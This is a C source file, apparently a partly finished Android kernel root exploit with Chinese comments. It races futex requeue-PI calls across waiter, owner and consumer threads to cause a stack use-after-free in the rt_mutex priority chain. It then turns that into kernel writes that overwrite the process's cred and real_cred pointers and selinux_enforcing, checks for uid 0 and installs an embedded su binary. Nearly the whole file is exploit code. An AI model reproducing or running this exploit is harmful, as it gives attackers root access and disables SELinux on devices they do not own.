#include "common.h"

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
int memfd_leak;

static void trace(const char *msg);

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

  // 1. 先锁定 f_pi_chain（建立 PI 链）
  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("waiter lock chain errno=%d\n", errno);
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;

  // 2. FUTEX_WAIT_REQUEUE_PI → 被 requeue 到 f_pi_target
  //    → rt_mutex_wait_proxy_lock 阻塞 → owner 释放锁 → waiter 获取锁
  //    → rt_mutex_cleanup_proxy_lock 检查 owner==current → 跳过 remove_waiter
  //    → pi_blocked_on 不被清理！(stack-UAF!)
  //    → futex_wait_requeue_pi 返回 → 栈回缩 → waiter "释放"
  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long fwq_ret = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int fwq_errno = errno;
  char fwq_buf[64];
  int fwq_len = snprintf(fwq_buf, sizeof(fwq_buf), "fwq ret=%ld errno=%d\n", fwq_ret, fwq_errno);
  if (fwq_len > 0) trace(fwq_buf);

  // 3. 此时 pi_blocked_on 仍指向已释放的 waiter 栈空间 (stack-UAF!)
  //    do_select 在同一块栈上分配 fd_set → 覆盖 waiter
  //    consumer 调用 sched_setattr → rt_mutex_adjust_prio_chain
  //    → 通过 pi_blocked_on 访问已释放的 waiter → 读到 fd_set 值！
  trace("w1\n");
  do_pselect_fake_lock_route();
  trace("w2\n");
  atomic_store(&route_done, 1);
  trace("w3\n");

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) {
    pr_error("owner lock target errno=%d\n", errno);
  }

  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&owner_started, 1);

  // 等 waiter 被 requeue 到 f_pi_target，然后释放 f_pi_target
  // 让 waiter 获取锁 → 触发 stack-UAF (pi_blocked_on 不清理)
  usleep(200000);  // 200ms 等 waiter 被 requeue
  futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  trace("ou\n");  // owner unlocked f_pi_target

  // 之后再锁 f_pi_chain（waiter_thread 会在 do_select 后释放）
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;

  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      if (atomic_load(&punch_consume_stop) ||
          atomic_load(&punch_consume_go) != seq) {
        continue;
      }
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) {
        usleep((useconds_t)delay_usec);
      }
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) {
          break;
        }
        atomic_fetch_add(&consumer_calls, 1);
        /* Alternate nice so __sched_setscheduler actually calls rt_mutex_adjust_pi. */
        int consumer_nice = (atomic_load(&consumer_calls) & 1) ? 19 : 0;
        errno = 0;
        long sched_ret = sched_setattr_tid(tid, consumer_nice);
        if (sched_ret == 0) {
          atomic_fetch_add(&consumer_success, 1);
        }
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }

  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0;
  cfi_last_errno = 0;
}

static void trace(const char *msg);

void run_main_route_threads(void) {
  reset_main_route_state();

  trace("r1\n");
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  trace("r2\n");
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  trace("r3\n");
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  trace("r4\n");

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
  }
  trace("r5\n");

  // requeue waiter 从 f_wait 到 f_pi_target
  // waiter 在 rt_mutex_wait_proxy_lock 中阻塞
  usleep(100000);
  trace("r6\n");
  errno = 0;
  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
  trace("r7\n");

  // 等待 owner 释放 f_pi_target（让 waiter 获取锁，触发 stack-UAF）
  // owner_thread 在 owner_chain_done 后释放 f_pi_target
  // 等 waiter_thread 的 futex_wait_requeue_pi 返回（进入 do_select）
  // 然后 consumer 在 do_select 期间 fire
  while (!atomic_load(&route_done)) {
    usleep(10000);
  }
  trace("r8\n");
}

static int trace_fd = -1;
static void trace(const char *msg) {
  if (trace_fd < 0) {
    trace_fd = open("/sdcard/Download/trace.txt", O_WRONLY|O_CREAT|O_APPEND|O_SYNC|O_CLOEXEC, 0666);
  }
  if (trace_fd >= 0) {
    write(trace_fd, msg, strlen(msg));
  }
}

/*
 * 内核读接口: 从 mm_struct 地址推导 task_struct.
 *
 * kernelsnitch 在 clone_leak_child 内运行, leak 的是 CHILD 的 mm_struct.
 * 推导链 (两次内核读):
 *   child mm_struct --mm->owner@+0x408--> child task_struct
 *                 --task->real_parent@+0x628--> parent task_struct (exploit 进程)
 * 我们要 root 的是 exploit 进程 (parent), 所以返回 parent task_struct.
 *
 * 内核读通过独立的 kread 后端 (/proc/kcore 或 /dev/mem), 不依赖已失效的
 * ashmem/configfs. 读到的指针用 is_kernel_ptr 做基本 sanity check.
 *
 * 注: 若将来让 kernelsnitch 在 parent 线程内运行 (直接 leak parent mm),
 * 则只需读一次 mm->owner, 不需要 follow real_parent. 当前默认 follow.
 */
static int g_leak_follow_real_parent = 1;  /* child mm: 需 follow 到 parent */

static uintptr_t leak_task_struct(uintptr_t mm_struct_addr) {
  if (!mm_struct_addr || mm_struct_addr == (uintptr_t)-1) {
    return 0;
  }
  if (kread_open() != 0) {
    pr_error("leak_task_struct: no kernel read backend "
             "(need /proc/kcore or /dev/mem openable in this domain)\n");
    return 0;
  }

  uintptr_t child_task = kread64(mm_struct_addr + MM_OWNER_OFF);
  pr_info("leak mm->owner=%016zx\n", child_task);
  if (!is_kernel_ptr(child_task)) {
    pr_error("leak_task_struct: bad mm->owner (kernel read returned junk)\n");
    return 0;
  }

  if (!g_leak_follow_real_parent) {
    return child_task;
  }

  uintptr_t parent_task = kread64(child_task + TASK_REAL_PARENT_OFF);
  pr_info("leak child->real_parent=%016zx\n", parent_task);
  if (!is_kernel_ptr(parent_task)) {
    pr_error("leak_task_struct: bad real_parent (kernel read returned junk)\n");
    return 0;
  }
  return parent_task;
}

static int check_uid_zero(void) {
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd < 0) return 0;
  char buf[1024];
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0) return 0;
  buf[n] = 0;
  char *p = strstr(buf, "Uid:");
  if (!p) return 0;
  int uid = -1;
  sscanf(p, "Uid: %d", &uid);
  pr_info("check uid=%d\n", uid);
  return uid == 0;
}

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;

  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  log_startup_context();
  init_ashmem_path();

  pin_to_core(CORE);

  /*
   * Cred 直写路线 (参考 dijun 成功案例):
   *   mm leaked → walk#1 写 real_cred = <spray node addr>
   *            → walk#2 写 cred     = <spray node addr>
   *            → walk#3 写 selinux_enforcing = 0
   *
   * 写入机制 (chain_disasm.txt 反汇编确认):
   *   PI 链 rb_insert 写的是 **节点地址** (spray 对象 &node.pi_tree_entry),
   *   不是 write_pc / INIT_CRED!  (rt_mutex_adjust_prio_chain:
   *   line 193 str x25,[x11,x13] 与 line 407-409 str x0,[x11,x13],
   *   x0 = node.pi_tree_entry, x11 = 被控 parent, x13 = rb_child 偏移)
   *   写入目标 = 任意地址, 由 fake_w0.pi_tree_entry.rb_left/rb_right
   *   指向 (target-8 / target-0x10) 决定.  即: *(target) = node_addr.
   *
   * 推论 (关键, 待设备验证): 既然写的是节点地址, 要让 task->cred/real_cred
   *   指向有效 cred, spray 页面必须在该节点偏移处放一份 **伪造 cred**
   *   (uid=0, gid=0, cap=全开, securebits=0, ...). 目前 prepare_skb_payload
   *   把 fake_w0.pi_tree_entry 填成 {write_pc, write_right, write_left},
   *   不含 cred —— 这是下一步必须补齐的部分 (在 spray 页面安排伪造 cred
   *   并让插入节点落在它上面).  walks[].value 此处仅作文档用途.
   *
   * backup_v1 已有基础: kernelsnitch 接口, set_pselect_write 参数化,
   *   prepare_skb_payload 自定义模式 (pselect_write_target!=0),
   *   stack_uaf_lock, run_main_route_threads 三线程 PI 链.
   */
  struct {
    uintptr_t target;  /* 写入目标地址 (real_cred / cred / selinux) */
    uintptr_t value;   /* 文档用途: 期望写 init_cred / 0 (实际写的是节点地址) */
    const char *name;
  } walks[3];
  walks[0].target = 0;               walks[0].value = INIT_CRED; walks[0].name = "real_cred";
  walks[1].target = 0;               walks[1].value = INIT_CRED; walks[1].name = "cred";
  walks[2].target = SELINUX_ENFORCING; walks[2].value = 0;        walks[2].name = "selinux";

  /* 1. 第一次 prepare: 触发 kernelsnitch leak mm_struct + spray */
  set_pselect_write(0, 0, 0); /* 默认模式触发 kernelsnitch, spray 目标后续覆盖 */
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  if (!page_base || !fake_fops || !fake_w0) {
    pr_error("page prep failed\n");
    return 1;
  }

  /* 2. 获取 mm_struct 地址 (kernelsnitch 已在 prepare_kernel_page 内跑过) */
  uintptr_t mm_struct = current_kernelsnitch_mm_struct();
  if (mm_struct == (uintptr_t)-1 || mm_struct == 0) {
    pr_error("kernelsnitch mm_struct leak failed\n");
    return 1;
  }
  pr_info("---mm leaked mm_struct=%016zx\n", mm_struct);

  /* 3. 读 mm->owner → task_struct (可插拔内核读, 待实现) */
  uintptr_t task_struct = leak_task_struct(mm_struct);
  if (!task_struct) {
    pr_error("task_struct leak failed — need kernel read of mm->owner\n");
    pr_info("TODO: implement leak_task_struct (configfs has bug, need alt kernel read)\n");
    return 1;
  }
  walks[0].target = task_struct + TASK_REAL_CRED_OFF;
  walks[1].target = task_struct + TASK_CRED_OFF;
  pr_info("task=%016zx real_cred=%016zx cred=%016zx init_cred=%016zx\n",
          task_struct, walks[0].target, walks[1].target, (uintptr_t)INIT_CRED);

  /* 4. 三次 walk 直写 cred + selinux */
  for (int i = 0; i < 3; i++) {
    pr_info("=== walk #%d/%d %s target=%016zx value=%016zx ===\n",
            i + 1, 3, walks[i].name, walks[i].target, walks[i].value);

    /* 设置 cred 直写目标 (target-8 因写入位置 = write_left + 8) */
    set_pselect_write(walks[i].target - 8, walks[i].value, 0);

    /* 重新 prepare page: 用新 pselect_write_target 构造 fake_w0.pi_tree.rb_left
     * 注意: prepare_good_kernel_page 会重跑 kernelsnitch, mm_struct 可能变化,
     *       但 task_struct 地址不变 (一旦 leak 完成). */
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
    if (!page_base || !fake_fops || !fake_w0) {
      pr_error("page prep failed for walk %d\n", i + 1);
      return 1;
    }

    /* 设置 pselect_user_lock (stack-UAF waiter->lock) */
    memset(pselect_user_lock, 0, sizeof(pselect_user_lock));
    pselect_user_lock[0] = 0;                        /* wait_lock = 0 (unlocked) */
    pselect_user_lock[1] = (uint64_t)fake_w0;        /* waiters.rb_node = fake_w0 */
    pselect_user_lock[2] = (uint64_t)fake_w0;        /* waiters.rb_leftmost = fake_w0 */
    pselect_user_lock[3] = (uint64_t)fake_task | 1;  /* owner = fake_task|1 (PI flag) */

    pr_info("hop base=%016zx w0=%016zx task=%016zx fops=%016zx user_lock=%p\n",
            page_base, fake_w0, fake_task, fake_fops, (void *)pselect_user_lock);

    /* 触发 stack-UAF + PI 链 (waiter/owner/consumer 三线程) */
    trace("pre_route\n");
    run_main_route_threads();
    trace("post_route\n");

    /* cred walk 后检查 uid 是否已变 0 */
    if (i < 2 && check_uid_zero()) {
      pr_success("uid=0 after walk #%d (%s written)\n", i + 1, walks[i].name);
    }
  }

  /* 5. 最终检查: uid=0 + selinux permissive */
  {
    int enforce_fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
    char buf[2] = {0};
    if (enforce_fd >= 0) {
      read(enforce_fd, buf, 1);
      close(enforce_fd);
    }
    int uid_zero = check_uid_zero();
    pr_info("final uid=%d selinux_enforce=%c\n",
            uid_zero, buf[0] ? buf[0] : '?');
    if (uid_zero && (buf[0] == '0' || buf[0] == '?')) {
      pr_success("root path ready: uid=0 selinux=%c\n", buf[0] ? buf[0] : '?');
      install_embedded_su(NULL);
      return 0;
    }
  }
  return 1;
}
